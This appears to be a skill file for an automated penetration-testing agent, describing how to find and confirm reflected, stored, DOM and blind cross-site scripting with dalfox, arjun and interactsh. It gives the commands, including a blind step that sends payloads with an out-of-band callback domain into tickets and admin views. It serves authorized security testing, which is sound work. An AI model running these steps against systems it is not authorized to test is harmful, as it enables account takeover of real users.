---
name: attack-xss
description: Reflected, stored, and DOM XSS — prove script actually executes in a victim context, not just that input reflects.
category: web-application
tags: [xss, injection, client-side, dom, blind]
cwe_ids: [CWE-79]
chains_with: [oob-interactsh, attack-ssti]
tools: [dalfox, arjun, interactsh-client, nuclei, curl]
version: "1.0"
---

# XSS

## Objective
Prove attacker-controlled script **executes** in another user's browser context — a fired payload, a
captured DOM effect, or an out-of-band callback — not merely a `<script>` string echoed in the body.
Target-facing runs go through the leash: `tools/leashed.sh $T bin/<tool> …` (`$T` = target dir).

## Methodology
1. **Mine sinks & params.** Pull reflected/stored params from recon; expand hidden ones with
   `bin/arjun -u "$U" -oJ raw/xss/params.json`. Note every landing spot: HTML body, attribute, JS
   string, `href`/`src`, and stored views (profile, comments, admin log panels).
2. **Reflected — auto-verify execution.** dalfox fires each payload in a headless browser and only
   flags `[POC]` on real execution:
   `tools/leashed.sh $T bin/dalfox url "$U?q=FUZZ" --format json -o raw/xss/dalfox.json`.
   Batch many URLs/params with `bin/dalfox pipe < urls.txt`.
3. **Stored.** Inject on the write endpoint, then re-fetch the render/sink page (often a different
   host or an admin view) and confirm the payload fires **there** — the victim context is the point.
4. **DOM.** Source→sink in client JS:
   `tools/leashed.sh $T bin/dalfox url "$U" --deep-domxss --mining-dom`. Trace
   `location`/`postMessage`/`hash` → `innerHTML`/`eval`/`document.write` and prove the fire.
5. **Blind.** Start `bin/interactsh-client -json -o raw/xss/oob.jsonl` (see `oob-interactsh`), hand
   its domain to dalfox `-b "https://<id>.oast.fun"`, and drop the marked payload into fields that
   surface elsewhere (support tickets, User-Agent logs, admin dashboards). A callback = confirmed.

## What counts as a finding
- **High:** proven execution — a dalfox `[POC]` with the firing payload, a captured DOM effect, or an
  interactsh callback for blind. Stored/blind firing in a privileged victim context (admin) = high.
- **Medium:** execution gated behind heavy user interaction, or self-only DOM XSS.
- **Lead only:** input reflects but no payload fires (encoded, CSP-blocked, WAF-stripped). A bare
  reflection is a `[UNCONFIRMED CANDIDATE]`, never an XSS finding (see `poc-standard`).

## Evidence
Under `raw/xss/`: the exact injecting request, the dalfox JSON carrying the `[POC]` payload, the blind
callback line (unique subdomain) from `oob.jsonl`, and a runnable repro (`.sh`/`.hurl`) plus one-line
steps. All target-facing HTTP goes through `tools/leashed.sh`.
